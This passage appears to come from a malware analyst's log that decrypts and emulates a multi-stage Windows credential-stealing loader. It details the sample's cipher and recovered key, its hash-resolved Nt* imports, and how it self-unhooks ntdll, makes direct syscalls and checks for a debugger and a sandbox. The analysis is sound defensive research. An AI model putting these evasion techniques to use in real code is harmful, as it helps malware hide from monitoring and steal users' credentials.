- **`Process::Kill` with `GetProcesses`** is a defence-evasion capability nobody had
  seen on this sample.

**Where the chase stops, and why de4dot is the next tool.** The proxy fields are loaded
by tiny 12-to-25-byte wrapper methods — `PeekExtractor` for `GetObject`,
`ConfigureLiteralResolver` for `Assembly::Load`, `NewRecommender` for `DownloadFile` —
and real code calls those, with 885 internal bindings meaning proxies on proxies. The
string table adds another layer: `RecordInternalAllocator` is control-flow flattened
across 345 dispatcher states, building a 32-byte key and a 16-byte IV one byte per
state, XORing the key against the finished IV, and splicing bytes derived from the
assembly's own identity into the IV. Hand-tracing that is not viable — several indices
are written by multiple states with different values, so the result depends on a path
decided by opaque predicates.

**Decrypting `na3PRqPuA2` was the highest-value open item and it is now closed** —
by the inverse index rather than by de4dot. This paragraph used to say it was
"clearly a deobfuscator's job rather than a decompiler's", and that was the wrong
call: the obstacle was never that the code could not be read, it was that nothing
said *which* code to read. An index over data already in hand answered that. de4dot
was never run against it.

**For gap 4, a weak negative.** No VM, sandbox, debugger, WMI or hardware-identity
token appears anywhere in this image, in either encoding — searched for explicitly.
That is evidence against anti-analysis as the explanation for the deterministic
crash, and it is weak evidence, because both the string table and the payload are
encrypted. **That search has now been run against stage 3 as well, and it holds —
see *Stage 3 carries no anti-analysis primitives* below.**

### The call graph, rebuilt — and the payload decrypted, 09 Aug

The open task from the section above, done. `scripts/dotnet_meta.py --callgraph`.

**The inverse index is the whole trick.** The decrypted map says what each proxy
field *is*; only a scan of every method body says who *uses* it. With both, a
proxy-mediated call is an ordinary edge. The numbers: **1,181 of 1,181 bindings are
loaded, by 785 methods**, giving 7,322 edges over 3,697 bodies. That every single
binding has a consumer is worth as much as the original Field-token self-check —
a map with dangling entries would mean the decode or the scan was incomplete.

**It found the map by itself.** `find_proxy_map` decrypts each candidate resource
and keeps the one whose plaintext is all Field-token keys, rather than keying on
the resource *name*, which is generated per build. The existing self-check is
strong enough to serve as the locator, so nothing here is specific to this sample's
naming.

**First, a decoder bug that had to be fixed before any of it could be trusted.**
The IL decoder was missing the comparison-branch families (`0x2E`–`0x37` short,
`0x3B`–`0x44` long), `endfinally`, `ldsflda`, `ldc.i8`/`ldc.r4`/`ldc.r8` and the
`ldind`/`stind`/`conv.ovf` groups. Every one carries or implies an operand, so each
desynchronised the stream after it — and the flattened methods, which are the ones
worth reading, are exactly the ones full of `beq` and `endfinally`. The module's own
comment on the two-byte table had named this failure mode; the one-byte table had
the same hole. **The check that it is fixed is structural, not a spot check: across
all 3,697 bodies the decoder now leaves 0 undecoded bytes in 61,113 instructions.**
An incomplete table cannot produce that, because an unknown opcode's operand
reliably decodes to more unknowns. Before the fix, three proxy bindings looked
orphaned; they were decode casualties.

**Every wrapper of interest has zero direct callers**, which is what call hiding
buys and why the graph was needed:

| Wrapper | Really calls | Reached from |
|---|---|---|
| `#473 PeekExtractor` | `ResourceManager::GetObject` | `#465 AssembleBuilder` ← `#249` |
| `#407 ConfigureLiteralResolver` | `Assembly::Load` | `#250 AnalyzeSpec` ← `#249` |
| `#408 RateResolver` | `Assembly::get_EntryPoint` | `#250 AnalyzeSpec` ← `#249` |
| `#383 NewRecommender` | `WebClient::DownloadFile` | `#244` ← `#249` |

**One root reaches everything.** `#249 BuildModule` reaches **554 internal methods
and 91 distinct external members** — the entire capability set the proxy map had
only listed. `#250 AnalyzeSpec` is textbook reflective loading, now readable
end to end: `Assembly.Load(<static field 0x400006d>)`, then `EntryPoint`, then
`MethodBase::Invoke(null, args)` with the argument array shaped by whether
`GetParameters()` is empty.

**`#1096` was the trap the graph disarmed.** Two methods reach
`ResourceManager::GetObject`, and the other one lives in
`MemCompress.Mapping.MapperRunner` — the WinForms decoy, fetching dialog bitmaps.
Name-matching alone would have put an afternoon into it. Its declaring type is what
tells them apart.

**Finding the decryptor was a negative result first.** `--xref CreateDecryptor`
returns **two** methods in the whole image, both in
`MemCompress_Pro.Management.EditableManager`, which is the protector's own runtime,
and neither is reachable from `#249`. **There is no cryptographic API on the payload
path at all** — so the decryptor had to be hand-rolled IL. Searching the 554
reachable methods for the *shape* of a byte cipher — arithmetic plus `ldelem.u1` /
`stelem.i1`, no external calls — returned two candidates, and the first was it.

**`#470 ConcatAllocator`**, 92 instructions, no external calls, sitting in the same
type as the resource fetch:

    d[i] = ((d[i] ^ key[i % len(key)]) - d[(i + 1) % len(d)] + 256) % 256

over the array shortened by one, with `key = Encoding.ASCII.GetBytes(arg1)`.

**The key was recovered, not guessed, and this is the part to reuse.** `d[i+1]` is
still ciphertext when byte `i` is written, so the recurrence inverts against known
plaintext: `key[i % klen] = c[i] ^ ((plain[i] + c[i+1]) % 256)`. Run against a stock
MZ/DOS stub, the recovered stream came back **printable ASCII repeating with period
10** — which is the self-check, because a wrong guess is not printable *and*
periodic. The key is **`HREWPjFNAr`**. No brute force was run.

That is the direct counterpart to the standing lesson about the ten decoy literals.
There, roughly 4,000 key derivations were spent on strings placed to be guessed at.
Here the key was never in a string at all, and **one algebraic relation read off the
IL replaced the entire search**.

**What came out.** 284,672 bytes, sha256 `e84f7824…`, kept XOR-wrapped as
`stage3_native_e84f7824.xor9` beside the assembly. It is a **native x86 PE32, not a
managed assembly**: no COM descriptor, no imports at all, a single executable
`.text`, entry point `0x2680`, GUI subsystem. Roughly 7 KB of x86 stub at
`0x1000`–`0x2c00` — ordinary prologues, `rep movsd`, an XOR-then-compare constant
check — and then 272 KB at entropy 7.999, which is its own encrypted stage. **So
this is another loader, and the config and C2 are one layer further down.**

**Byte 0 is asserted, not recovered, and the tool says so.** The cipher's loop guard
is `i <= d.Length`, so a final iteration wraps `i % d.Length` back to zero and
overwrites the byte it had already decrypted. `--decrypt-payload` prints what it
found there (`0xf0`) and sets `M`. Everything else validates on its own: `e_lfanew`
`0xb8` with `PE\0\0` exactly there, the section table coherent with `SizeOfImage`,
and the header padding at `0x200`–`0x1000` decrypting to **100.00% zero**, which is
3.5 KB of plaintext that could not come out right under a wrong key.

**And the first version of that self-check was worthless, which a negative control
caught.** `e_lfanew` sits at bytes 60–63 and `PE\0\0` at 184–187; against a ten-byte
key those exercise key offsets 0–3 and 4–7 and **never touch offsets 8 or 9**, so a
key wrong in its last character passed both cleanly. Exactly the shape of the
standing lesson about validating a reimplemented PRNG on its first output. The
padding run is the check that decides, because it is kilobytes long and therefore
covers every key offset many times over. Running it against deliberately wrong keys
is what made the difference visible — and the numbers are themselves informative:
one wrong key byte leaves the padding **90.01%** zero, which is 1 in 10 and
independently confirms the key length. `--decrypt-payload` now refuses to write
output when the check fails, rather than emitting a plausible-looking file.

**Two things this hands the pipeline, one of them uncomfortable.**

- **Stage 3's `TimeDateStamp` is `0x5ff2b99b` — the same timestamp `RegSvcs.exe`'s
  own header carries.** *Reading a run* says to read the two timestamps side by side
  and treat an image years newer than its host as foreign. On this sample that check
  is defeated by construction, and it is defeated silently. The carver's structural
  findings (`unmapped`, no module covering the range) do not depend on it; the
  timestamp line in the report does.
- **`Assembly::Load` cannot be this resource's consumer**, because a native PE is not
  loadable that way. `#249` also passes the same static field to `#251`/`#248`, and a
  separate root reaches `Marshal::GetDelegateForFunctionPointer` — which, with the
  x86 and x64 trampoline stubs already found in the field data, is the plausible
  execution path. **Which of them actually runs is not established**, and guessing it
  would repeat the mistake this section exists to record.

### Stage 3's inner blob — emulated, partly unpacked, not finished, 09 Aug

Stage 3 is 7 KB of x86 stub plus a 272 KB blob at file offset `0x2c00` — length
`0x42c00`, which is a literal in the entry function's own argument set rather than a
guess, and `0x45800 - 0x42c00` lands exactly on it. **The blob is not recovered.**
What follows is how far it got and precisely where it stopped.

**Static attack: exhausted, and the negative is the useful part.** The blob has flat
byte statistics, **17,088 sixteen-byte blocks with not one repeat**, and no
periodicity at any period up to 192. Repeating-key XOR, additive, subtractive, both
chained-recurrence forms and RC4 were run against a stock MZ/DOS stub over 55
candidate keys drawn from the code constants and the 295-byte gap ahead of the blob.
No MZ from any of them. **The stage-2 trick does not transfer** — there is no simple
keyed transform here to invert, and no amount of further guessing changes that.

**So the stub was emulated instead** — `scripts/emulate_native_stub.py` on Unicorn,
with `scripts/win32_emu_env.py` supplying the process around it. A decryptor does not
have to be understood to be run, which matters because this stub is flattened the same
way stage 2 was, only in machine code: an if-else handler chain behind a dispatcher
that locates its context by scanning the stack for the cookie `0x589dee90`, planted by
the entry function at `0x2701`, and relocates itself via a `call`/`pop` get-EIP at
`0x40117a`. Reversing all of that statically is a much larger job than running it.

What emulation established that static reading had not:

- the stub runs **~5.8M instructions needing no imports at all**, walking the PEB and
  resolving by name from the loader module list
- it calls **`NtAllocateVirtualMemory` directly, never `VirtualAlloc`** — worth
  knowing, because a hook placed on the Win32 name would not see it
- it asks for **`0x457e1` bytes**, copies itself into that allocation and **jumps into
  it**, after which the allocation holds real code including a statically linked CRT
  (`memset`, `strlen`, `wcslen`) and a CRC-32 table builder (`xor eax, 0x4c11db7`,
  256 entries — so a CRC or checksum is part of whatever comes next)
- **it does unpack**: the allocation moves from entropy 7.969 to 7.642 and from
  278,455 to 269,003 non-zero bytes

**It does not stall. That claim was wrong, twice, and the correction is the most
useful thing in this section.** Two successive versions of this document said the
stub stalls — first "is not unpacking at all", then "unpacks and then stops, running
longer will not help". Single-stepping settled it: the loop at `0x40231f` is **RC4
PRGA**, `i = i + 1`, `j = j + S[i]`, swap, keystream byte, with `[ctx+0x60]` counting
bytes against a length in `[ctx+0x90]`. It is 99 instructions per byte, so a 300k
instruction sample covers 3,031 bytes and its single exit branch reads `taken=0` while
being perfectly healthy. Reading the loop's own counter shows it running 3,852 →
4,341 → **13,670 of 13,670, complete**, after which execution moves on.

**Both wrong calls came from the same mistake: watching a buffer nobody had shown was
the one being written.** The check sampled `allocs[0]`, the `NtAllocateVirtualMemory`
region. This RC4 pass writes to a **stack** buffer at `0x2ff040`. So the allocation
holding still was never evidence about progress, and "unchanged" read as a finding
when it was a statement about where the check was pointed. That is the same shape as
`collection_available` in gap 4b, and as the dead path markers: **an instrument aimed
at the wrong place reports absence, and absence looks like an answer.** Measure the
subject's own counter where it has one — the loop had a byte counter in its context
struct the whole time.

**What is actually unknown** is whether the emulation *diverges*. The harness answers
`GetProcAddress` with a `Sleep` stub for every name, claims success from
`VirtualProtect`, and invents a heap handle for `RtlGetProcessHeaps`. Any of those can
steer the code down a path the real thing would not take, silently and without ever
faulting. Logging each API call with arguments and return value, and looking for one
whose answer the code visibly rejects, is the open question — not "why is it stuck".

**And then the hang turned out to be real after all — in a different loop.** The
retraction above is right about `0x40231f`: that RC4 pass completes. It was too broad.
Running 2.4 billion instructions with a scan of every mapped region after each 100M
found no PE and pinned EIP, from the second phase onward, inside `0x2017271`–
`0x2017283` — the CRC-32 loop **in the allocation**, not the RC4 loop in the image.
Both are true at once: RC4 finishes, and the code after it hangs. Single-stepping at
60M instructions caught the first, the original 600M-block run had caught the second.
**Two honest samples of one run at different moments produced two contradictory
headlines** — so say which moment a claim is about.

**What the hang is, measured rather than guessed.** `0x2017291` is
`crc32(buf, len, ctx)`, rebuilding a 256-entry table on the stack every call, which is
why it dominates. Single call site `0x20261e5`; the compare two instructions later is
`cmp eax, [ebp+8]`, so the wanted hash is a **parameter, not an immediate**. Watching
its arguments across 32M instructions: 2,071 calls, **three distinct tuples**, buffer
never moving — hashing `kernel32.dll`, `ntdll.dll` and `stage3.exe` on a cycle. The
last is a name `win32_emu_env.py` invented, which is how the divergence announced
itself.

**Growing the loader list from 3 modules to 23 was a real fix and not the blocker.**
With `RegSvcs.exe` as the image name — what this sample actually hollows — plus twenty
real DLLs, it now hashes all 23, lowercased first, and still matches nothing.

| | |
|---|---|
| Algorithm | CRC-32/MPEG-2: init `0xFFFFFFFF`, non-reflected, poly `0x04C11DB7`, final NOT |
| Parameters | shifts 24 and 8, mask `0xFF`, carried in a ctx struct XORed with `0x4a`, `0xc6`, `0xf5` |
| Verified | reproduces `ntdll.dll` `0x0b4e1ae2`, `kernel32.dll` `0xadedab08`, `user32.dll` `0xc810589c` |
| Wanted | **`0xe11da208`**, identical across all 388 comparisons |

**The wanted hash matches nothing on this machine.** Brute-forced against 4,419 real
filenames from `SysWOW64`, `System32` and `Windows` — ascii and UTF-16LE, with and
without extension, either case. No hit. The constant appears **nowhere** in stage 3's
image or in the allocation, so it is computed at runtime rather than stored.

**Where that leaves it, precisely.** The question is no longer *why does it hang* but
*where does `0xe11da208` come from, and what name was ever going to satisfy it*. The
compare function takes it as an argument, so its caller is the next thing to read.
Note the surrounding code does the same thing with the hash as a literal — **64
distinct `push imm32; call` sites** in the allocation, most into `0x20040a1` — so this
is a whole resolve-by-hash scheme and the stuck lookup is one entry in it.

**Where `0xe11da208` comes from — and the capability set that fell out of asking.**
Walking the frame chain at the compare gives
`0x202ec7e` <- `0x2017051` <- `0x20071be` <- `0x202f00d` <- `0x20309ac` <-
`0x401d2e` <- `0x402a9f`. `0x202ec01` is `get_module_base_by_hash(hash)`: it walks
`PEB->Ldr`, converts each `BaseDllName` to lowercase ascii, CRC-32s it, and returns
`DllBase` on a match or 0 when the list runs out. The hash reaches it from
`0x2017038`:

    push 0xd3 ; push 0x246e8fe6 ; call 0x2004181 ; push eax ; call 0x202ec01

**So the hashes are obfuscated too.** `0x2004181` builds a 20-byte buffer, XORs it
with the per-site key byte and derives the real constant — `decode(0x246e8fe6, 0xd3)
= 0xe11da208`, which is why the value appears nowhere in the image.

**That decoder did not need reversing, only calling.** `scripts/decode_name_hashes.py`
warms the image, finds every `push imm32 ; push imm32 ; call 0x2004181` site and runs
the decoder on each. **45 sites, and 43 decode to names** once matched against a
20,682-entry dictionary built from this host's own `SysWOW64`/`System32` filenames and
export tables. **This is the payload's capability set recovered without unpacking it:**

| | |
|---|---|
| Injection | `NtCreateSection`, `NtMapViewOfSection`, `NtUnmapViewOfSection`, `NtWriteVirtualMemory`, `NtReadVirtualMemory`, `NtProtectVirtualMemory`, `NtAllocateVirtualMemory`, `NtFreeVirtualMemory`, `NtGetContextThread`, `NtSetContextThread`, `NtSuspendThread`, `NtResumeThread`, `NtQueueApcThread`, `NtCreateProcessEx`, `NtOpenProcess`, `NtOpenThread` |
| Credentials | **`crypt32!CryptUnprotectData`** (3 sites), `CryptStringToBinaryA` |
| Registry | `NtCreateKey`, `NtSetValueKey`, `NtQueryValueKey`, `NtEnumerateKey`, `NtEnumerateValueKey` |
| File | `NtCreateFile`, `NtWriteFile`, `NtReadFile`, `NtQueryInformationFile`, `NtSetInformationFile`, `NtClose` |
| Token | `NtOpenProcessToken`, `NtQueryInformationToken`, `NtAdjustPrivilegesToken` |
| Recon / control | `NtQuerySystemInformation`, `NtQueryInformationProcess`, `NtQuerySection`, `NtOpenDirectoryObject`, `NtCreateMutant`, `NtDelayExecution`, `NtWaitForSingleObject`, and `explorer.exe` as a hashed process name |

**Two things that names deserve stating plainly.** It is a **direct-ntdll** loader —
every primitive is the `Nt` form, not the kernel32 wrapper, so a hook or monitor on
the Win32 names sees none of it. And `CryptUnprotectData` is **DPAPI credential
theft**; together with `CryptStringToBinaryA` that is the first evidence of what this
chain is actually *for*, after nine detonations that produced only a crash. It is a
capability, not an observation — the same standing caveat as the proxy-map inventory
in stage 2.

**Three hashes match nothing** on this host: `0xe11da208` (the module lookup that
hangs), `0x79dbe71d` and `0x5c4ee455`. A targeted sweep of 226 browser, CRT,
credential-store and LOLBin names across both encodings found none of them, so the
blocker is a name this bench cannot guess. Reading `0x2017038`'s own caller for the
context it expects is the next move, not more guessing — the standing lesson about
brute force and method bodies, one layer up again.

> **Two of those three are now cracked, and neither by a bigger wordlist.**
> `0x5c4ee455` is `"wow64"`, a bare stem, from the guest's own inventory;
> `0xe11da208` is `sbiedll.dll`, Sandboxie's injected DLL, from adding a corpus
> class this bench had never swept — modules that *other software injects*.
> Note what the paragraph above got right and wrong: "a name this bench cannot
> guess" was correct, and "sweep more names of the kinds already tried" was the
> wrong conclusion drawn from it. Only `0x79dbe71d` is still open. See
> *`0xe11da208` is `sbiedll.dll`*.

**The hang is fixed, and it was a bug in the harness — a precise, instructive one.**
Sampling the whole frame chain forty times gave **one** chain every time, so the loop
was not above `get_module_base_by_hash`, it was *inside* it. Its termination is:

    mov esi, [esi]            ; next = entry->Flink
    cmp [esi+0x18], eax       ; DllBase == 0 ?
    jne  <loop>               ; keep walking while non-zero

A real `InLoadOrderModuleList` is circular **through a head that lives inside
`PEB_LDR_DATA`**, and that head is not an `LDR_DATA_TABLE_ENTRY` — the bytes at
`head+0x18` are some other field, which reads as zero, and that is how every module
walk in Windows terminates. `win32_emu_env.py` had linked the last entry back to the
*first*, making a pure ring with no sentinel. A walker looking for a module that is
not present then circles forever. **The 2.3 billion instructions were my list, not
their code.** The fix links the last entry's `Flink` to the head, the first entry's
`Blink` likewise, and asserts `head+0x18` reads zero rather than trusting it, since
the whole termination argument rests on that one dword.

**With the list terminated it walks straight past and keeps going**, and the shape of
the remaining work changed completely — from *one unexplained hang* to *implement the
next API*:

| Blocks | Call |
|---|---|
| 5.7M | `NtAllocateVirtualMemory(0xffffffff, …, 0x3000, 0x40)` → the `0x457e1` region |
| 17.2M | `RtlGetProcessHeaps` |
| 24.6M | `RtlDosPathNameToNtPathName_U` |
| 27.1M | **`NtCreateFile(…, access 0x120089, …)`** |
| 33.8M | `RtlFreeHeap` |

**It is opening a file.** That is the first behaviour out of this chain that is not
setup, and it is consistent with the decoded capability set — `CryptUnprotectData`
alongside `NtCreateFile`/`NtReadFile` is a credential store being read. Each further
API implemented moves it one step; the structural obstacle is gone.

**Worth keeping from how this was found.** Three separate wrong calls preceded it —
"not unpacking", "unpacks then stalls", "environment gap or bail" — and every one came
from inferring a cause from an *indirect* signal. What settled it was reading the
loop's own exit condition and then sampling the frame chain, which answered "where is
the loop" in one measurement. The general form, now stated for the third time in this
document: **measure the mechanism, not a proxy for it.**

**It opens the file, and the file is `ntdll.dll`.** Implementing APIs until it got
there took four: `RtlDosPathNameToNtPathName_U`, `NtCreateFile`,
`NtQueryInformationFile` and `NtReadFile`. The sequence, from the call log:

    RtlDosPathNameToNtPathName_U(<ntdll's own BaseDllName.Buffer>)
    NtCreateFile("\??\ntdll.dll", access 0x120089)
    NtQueryInformationFile(class 5 = FileStandardInformation)   -> size
    RtlAllocateHeap(0x1bcec0)                                   -> file-sized buffer
    NtReadFile(..., 0x1bcac0) = STATUS_SUCCESS                  -> the whole file
    NtClose
    RtlAllocateHeap(0x1bf001)                                   -> image-sized buffer

`0x1bcac0` is **exactly** the size of this host's `SysWOW64
tdll.dll`, and the dumped
buffer is **byte-identical to it**. The second allocation is the mapped footprint, and
two further PE images appear in later allocations — so it reads a pristine `ntdll`
from disk and **manually maps it**.

**That is self-unhooking, and it explains the capability set rather than adding to
it.** A loader that wants syscall stubs no user-mode hook has patched reads a clean
`ntdll` off disk and uses those bytes instead of the loaded, possibly-hooked image.
It is exactly consistent with every decoded name being an `Nt*` form rather than a
kernel32 wrapper: this stage is building its own unhooked syscall path before doing
anything with `CryptUnprotectData`. **For this pipeline that is a detection note, not
just trivia** — a monitor hooking Win32 or even loaded-`ntdll` entry points sees none
of what follows, while `NtCreateFile` on `\??
tdll.dll` from a hollowed `RegSvcs`
is itself a strong, cheap signal.

**Backing the file with real bytes was a deliberate choice and worth stating.**
Answering `NtReadFile` with end-of-file does not stall the sample so much as turn the
run into a study of the harness. The host's own `SysWOW64` copy is both the honest
answer and the same file the sample would have got. Nothing is invented: when the host
does not have the file, the harness still returns end-of-file rather than fabricating
content, because a parser fed made-up bytes produces made-up findings.

**87 API calls in, no stage 4 yet.** Every PE in the allocations is a copy of `ntdll`,
raw or mapped. The payload is still setting up.

**One decoding bug found and fixed on the way**, because it showed as a corrupted
path: scanning for a UTF-16 terminator with `bytes.find(b"\0\0")` matches on an odd
boundary in `...l\0l\0\0\0`, truncating the last character and leaving a replacement
char. Step two bytes at a time. It first appeared as `'\??
tdll.dl\ufffd'`, which is
the kind of wrongness that is luckily loud — the same bug on a path with an even-index
match would have been silent.

**Past the file read, a second lookup that never hits, 10 Aug.** With the system
DLLs mapped for real the run is clean -- no faults, no unhandled APIs, 87 calls -- and
it then computes for 197 million basic blocks calling nothing. Single-stepping at 400M
instructions gives a **28-instruction cycle** over `0x2003c31`-`0x20043c0`:

- `0x2003c31` is a **case-insensitive byte compare**; the `'A'`/`'Z'`/`'a'`/`'z'`
  range tests with the +/-`0x20` fold are unmistakable.
- `0x20043a1` calls it at each offset, `jne <found>` **taken 0 of 14,243** -- a
  substring search whose target is not there.

**What it wants is a 6-byte pattern rather than a string**: `37 65 e9 a1 5e 6b`, built
on the stack at `0x2fe4f0`. **The haystack is its own first allocation** -- the
relocated image at `0x2001000`, byte `0x20111d1` at `+0x101d1`.

**The scan limit is not bogus, and an earlier revision of this section said it was.**
Read live from the snapshot, `[ebp-0xc]` is **273,392** (`0x42bf0`) -- the 272 KB
blob's own size less the needle -- with the counter at 58,867, a perfectly ordinary
21%. The 33.6 million figure previously quoted here is `[ebp-4]`, a different running
value; the loop is governed by the counter at `[ebp-0x10]`, which
`cmp eax, [ebp-0xc]` actually tests. **Reading the adjacent variable instead of the
governing one is the fifth instance of this exact error in this document** -- wrong
buffer, wrong register, wrong instruction, wrong variable, each time producing a
confident and wrong headline from a signal next to the real one.

**What the scan actually does is stranger than a stall.** Sampled every 150M
instructions the counter runs 58,867 -> 176,793 -> 11,927 -> 176,793 -> 3,726, so it
is **not one pass**: the search is re-entered against different buffers. And at
roughly 750M added instructions **the process jumps to address 0** and stops.

**That crash was nearly missed because of a flaw in the measuring script**, which is
worth recording alongside the finding. `Emulator.run` catches `UcError` and *returns*
the message rather than raising, and the sampling loop discarded the return value --
so eight further samples reported 64.7% progress against a machine that had been dead
since the fifth. The block count staying at 348,473,107 was the only tell. **A
harness that reports outcomes by return value needs its callers to read them**;
swallowing them turns a crash into a plateau.

**One of my own measurements is corrected here.** The "haystack base" figure from that
run is meaningless: `ECX` was sampled at the *call site*, where it holds the needle
pointer, while inside the compare `ecx` is the running offset. Only the needle and the
index are valid. Sampling a register at the wrong instruction is the same family of
error as watching the wrong buffer, and it is now the fifth instance in this document.

**Two environment bugs fixed getting this far**, both invisible with synthetic DLLs:

- The payload reads a clean `ntdll` off disk and then walks the **loaded** copy
  against it, so a 1 MB stub of zeros faulted past its end at `0x77134000`. Both
  system DLLs are now mapped as real images -- true RVAs, real `SizeOfImage`, real
  export table -- with interception at each export's real address, which also leaves
  the loaded image byte-correct for anything that checksums it.
- **In user-mode `ntdll`, `NtXxx` and `ZwXxx` are the same address.** Only one name
  can win an address-keyed index, and whichever came last in the export table did:
  `ZwCreateFile` won, every handler keyed on `NtCreateFile` silently stopped firing,
  and it surfaced only as "unhandled API". The index now prefers the `Nt` spelling.

**Stage 4 has not come out.** Every PE in the allocations is still a copy of `ntdll`,
raw or mapped.

**The bottleneck is now iteration cost, and it is worth fixing before more of this.**
Every diagnostic -- single-step, CRC arguments, frame chains, hash decoding, the
needle -- restarts from the entry point and re-executes hundreds of millions of
instructions to reach the interesting moment, at roughly 11 minutes per 900M. Unicorn
can be snapshotted: enumerate `mem_regions()`, dump each, save the register file,
restore on demand. That turns a six-minute question into a seconds-long one, and there
are plainly more questions coming.

**Where it actually stops: the WOW64 syscall boundary.**
The jump to address 0 is not a bug and not a missing API. Disassembling the return
address on the stack lands in the manually mapped `ntdll` at `0x23c5000`, in a run of
sequential syscall stubs it is executing from its own copy:

    mov eax, 0x36            ; system service number
    mov edx, 0x247a5c0       ; the WOW64 transition thunk
    call edx
    ret 0x10

and the thunk is `jmp dword ptr [0x2500014]`, whose slot **contains 0**. In a real
process the kernel fills `Wow64Transition` in at load; a copy read off disk has it
zeroed, and `fs:[0xC0]` is zero for the same reason.

**So the payload has routed around the layer this harness intercepts at.** Export
addresses are the wrong place to stand: it never calls `ntdll!NtCreateFile` at its
export, it calls its own unhooked copy of the stub. That is exactly why the API log
went quiet at 87 calls while the sample kept working, and it is the same fact the
decoded name set and the clean-`ntdll` read were both pointing at, now caught in the
act.

**One inference in the paragraph above was wrong and is worth keeping visible.** An
earlier revision read "SSNs `0x35`, `0x36`, `0x37`, `0x38` walk consecutively, so it is
stepping its own rebuilt table." They walk consecutively because **ntdll lays its stubs
out in service-number order**, so any four adjacent stubs do that; it says nothing
about what executed. The sample executed exactly one, SSN `0x36`, reached through a
generated wrapper at `0x202c930` that decodes an obfuscated hash, resolves the stub,
caches the pointer at `[esi+0xb64]` and tail-calls it with four arguments. *Adjacent in
memory is not sequentially executed* — the same family as reading the variable next to
the governing one.

### The syscall boundary, built — 10 Aug

`win32_emu_env.syscall_table()`, `install_syscall_gate()` and `Emulator._on_syscall`.
Both transitions are filled and pointed at one hooked page; the gate reads `EAX`, maps
it to a name, and dispatches into **the handlers that already existed**, keyed by name
as before. `api()` grew `arg_offset` and `cleanup` to serve both entry points and is
otherwise untouched. **Intercepting at the syscall boundary is where this malware
operates**, and it makes the harness immune to any later stage doing the same thing.

**The stack at the gate carries two return addresses, and that is the whole of the
difficulty.** The payload's `call` pushed one, then the stub's own `call edx` pushed
another, so arguments start at `esp + 8` rather than `esp + 4` — and the cleanup is
*not* the harness's to do, because the stub ends in `ret imm16` and pops them itself.
Getting either half wrong misreads every argument of every syscall while still looking
like it works.

**The service number is the low word of the immediate, and the check that proves it is
structural.** 99 of this host's stubs carry a non-zero high word (`NtDelayExecution` is
`0x60034`) selecting a wow64cpu turbo thunk. Two assertions, neither needing to know
the right answer: the numbers must be unique, and they must be **contiguous from
zero**. A kernel service table has no gaps, so a gap means a stub shape went
unrecognised — the same reasoning as counting the bytes the IL decoder could not name.

**It caught a hole immediately.** The first parse required
`mov eax, imm32 ; mov edx, <thunk> ; call edx` and returned 508 numbers with exactly
one gap, at `0x19`. That gap is `NtQueryInformationProcess`, whose stub is the
**dual-path** form — `call $+5 ; pop edx ; cmp byte [edx+0x14], 0x4b ; jne` choosing
between `call dword ptr fs:[0xC0]` and the thunk at run time. It is also why
`fs:[0xC0]` has to be filled and not just `Wow64Transition`: one export on this host
can reach the kernel either way. 509 entries, `0x0`–`0x1fc`, no gaps.

**Nothing is invented, and the check that established that is the most useful thing
here.** The first version filled the slot in every private copy the payload mapped,
which was a judgement call the harness had no right to make: on real Windows a copy
read off disk has that slot zeroed too. So it was measured instead — copy-filling
disabled, a read watch on the only two sources a real process has (the loaded image's
slot and `fs:[0xC0]`), and a write watch on each private copy's slot.

**The payload repairs itself, deliberately.** At 67,099,798 blocks, `0x202f454` reads
the **loaded** ntdll's slot and `0x202f457` writes it a byte at a time into
`0x2500014` — its own copy's slot — and into that copy only; the other two mapped
copies stay zero. That is the fixup which makes self-unhooking work on real Windows,
and it means the private-copy fill was **redundant**: the same run with it disabled
reaches the identical clean return at 377,374,188 blocks.

**So the original crash was the harness's own zero, propagated faithfully by the
malware.** The loaded image was mapped from disk and nobody filled its slot, the
payload dutifully copied that zero into its working copy, and the jump to address 0
followed. Fill what the loader fills — the loaded image and `fs:[0xC0]`, neither of
which is a judgement call — and the sample does the rest. `patch_ntdll_copies()`
survives for exactly one job, called only from `repair_wow64_crash()`: a state
captured *before* the loaded slot was filled recorded that zero, and the payload does
its fixup once, so `after_scan.state` carries a stale zero that resuming will never
repair. Snapshot repair, not a model of Windows, and the run output says so in those
words.

**The experiment had to be designed so it could fail.** The obvious version — watch
for reads with the copy already filled — cannot: a self-repair path guarded by
`if slot == 0` never executes, and the resulting silence is indistinguishable from a
sample that never looks. Withholding the invented value first is what made the
negative meaningful, and it turned out to be a positive. *A check aimed at the right
subject still has to be run in a state where the behaviour it looks for is possible.*

**`repair_wow64_crash()` resumes the dead machine instead of rebuilding it.**
`after_scan.state` faulted *at* the jump, so stack, registers and every page are
exactly what the transition would have been entered with; sending EIP to the gate
replays it. The guard is deliberately narrow — EIP `0`, `EAX`'s low word a known
service number, and `[esp]` pointing at the `ret imm16` that ends a stub — so it cannot
quietly rescue an unrelated jump to zero. It declined the *next* jump to zero on its
first outing, which is the only evidence worth having that a guard is real.

**Proven, on the checks this project already trusts.** `test_emu_snapshot.py` reports
`EQUIVALENT` — memory SHA-256, block count and all sixteen registers — against a
snapshot **written by the older code**, so restore stayed backward-compatible while
gaining the gate. A v2 save/restore round trip matches on memory, blocks and EIP. And a
fresh run from the entry point reproduces the restored run's call sequence exactly,
which is what says the gate is installed by `setup()` and not only by `restore()`.

### What was behind the boundary: a fingerprinting block, 10 Aug

Four calls, none of which any export hook could have seen:

| Blocks | Call | What it is |
|---|---|---|
| 348.5M | `NtQuerySystemInformation(0x23, buf, 2, 0)` | `SystemKernelDebuggerInformation` — two `BOOLEAN`s, which is why it asks for exactly 2 bytes |
| 351.4M | `NtQueryInformationProcess(-1, 0x7, buf, 4)` | `ProcessDebugPort` |
| 364.8M | `NtQuerySystemInformation(0x5, buf, 0x40000, 0)` | `SystemProcessInformation` — process enumeration |
| 377.4M | `RtlQueryEnvironmentVariable_U(0, "USERNAME", …)` | |

**This retires the caveat on *Stage 3 carries no anti-analysis primitives*, and does it
the way that section predicted it might.** That search covered the packed blob and the
partly unpacked allocation and said in terms that a negative there proves nothing.
These checks leave **no string and no distinctive instruction** — `rdtsc`, `cpuid` and
the VMware backdoor `in` were the right things to look for and are simply not what this
sample uses. It asks the kernel directly, through a hash-resolved stub in its own clean
ntdll. *A search can only clear the surface it can read.*

The debugger classes are answered as an ordinary machine with none attached. Each has
one correct answer, so nothing is invented — and answering them wrong is how a harness
talks a sample into bailing and then gets read as the sample being dormant.

**The clean-`ntdll` read now reads as one design rather than two.** Self-unhooking,
direct syscalls, hash-resolved imports and no Win32 wrapper anywhere are a single
decision: *be invisible to anything watching user mode*. For the pipeline that sharpens
